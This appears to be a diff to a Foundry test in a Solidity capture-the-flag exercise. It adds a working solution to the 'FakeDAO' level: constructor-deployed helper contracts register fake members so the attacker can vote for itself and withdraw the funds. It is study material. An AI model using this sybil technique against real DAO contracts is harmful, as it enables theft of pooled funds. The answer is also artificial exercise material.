@@ -5,6 +5,14 @@ import "./BaseTest.t.sol";
 import "src/10_FakeDAO/FakeDAO.sol";
 
 // forge test --match-contract FakeDAOTest -vvvv
+
+
+contract WolfInSheepsClothing {
+    constructor(FakeDAO realInstance) {
+        realInstance.register();
+    }
+}
+
 contract FakeDAOTest is BaseTest {
     FakeDAO instance;
 
@@ -15,7 +23,12 @@ contract FakeDAOTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        for (int i = 0; i < 9; i++) {
+            WolfInSheepsClothing wolf = new WolfInSheepsClothing(instance);
+        }
+        instance.register();
+        instance.voteForYourself();
+        instance.withdraw();
 
         checkSuccess();
     }
